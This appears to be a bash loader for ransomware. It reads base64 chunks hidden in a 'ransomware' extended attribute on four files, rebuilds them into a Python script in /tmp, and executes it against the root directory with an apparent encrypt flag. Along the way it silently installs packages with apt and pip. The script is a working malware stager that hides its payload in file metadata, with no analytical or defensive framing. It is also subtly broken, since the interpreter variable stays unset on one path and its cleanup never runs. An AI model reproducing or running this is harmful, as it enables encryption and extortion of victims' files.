#!/usr/bin/env bash
set -euo pipefail
set -x

# --- 0) Usage & Config ---
if [ $# -lt 1 ]; then
  echo "Usage: $0 <target_directory> [pattern]"
  exit 1
fi

TARGET_DIR="$1"
PATTERN="${2:-*}"
XATTR_NS="trusted"    # or "user" if you used that

if [ ! -d "$TARGET_DIR" ]; then
  echo "Error: $TARGET_DIR is not a directory"
  exit 1
fi

# --- 1) Select 4 files by criteria (glob + sort) ---
mapfile -t FILES < <(find "$TARGET_DIR" -maxdepth 1 -type f -name "$PATTERN" | sort | head -n 4)
if [ "${#FILES[@]}" -lt 4 ]; then
  echo "Error: Found only ${#FILES[@]} files matching '$PATTERN' in $TARGET_DIR; need at least 4."
  exit 1
fi

F1="${FILES[0]}"
F2="${FILES[1]}"
F3="${FILES[2]}"
F4="${FILES[3]}"

echo "[*] Using files:" \
     "$F1" \
     "$F2" \
     "$F3" \
     "$F4"

# --- 2) Ensure getfattr & python3 exist ---
for pkg in attr python3; do
  cmd=$([[ $pkg == attr ]] && echo getfattr || echo python3)
  if ! command -v "$cmd" &>/dev/null; then
    apt update
    apt install -y "$pkg"
  fi
done

# --- 3) Ensure Crypto via venv if needed ---
if python3 -c 'import Crypto' &>/dev/null; then
  PYTHON_CMD=python3
else
  pip install --upgrade pip pycryptodome
fi

# --- 4) Read the four chunks ---
CHUNK0=$(getfattr --only-values -n ${XATTR_NS}.ransomware "$F1")
CHUNK1=$(getfattr --only-values -n ${XATTR_NS}.ransomware "$F2")
CHUNK2=$(getfattr --only-values -n ${XATTR_NS}.ransomware "$F3")
CHUNK3=$(getfattr --only-values -n ${XATTR_NS}.ransomware "$F4")
for var in CHUNK0 CHUNK1 CHUNK2 CHUNK3; do
  [[ -n "${!var}" ]] || { echo "ERROR: $var empty"; exit 1; }
done

# --- 5) Decode to a real file and exec with flags ---
ENC="${CHUNK0}${CHUNK1}${CHUNK2}${CHUNK3}"
TMP="/tmp/main_v2.$$.py"
printf '%s' "$ENC" | base64 -d > "$TMP"
chmod +x "$TMP"

# Now run it with your desired parameters:
exec "$PYTHON_CMD" "$TMP" -p "/" -e

rm -rf "$TMP"
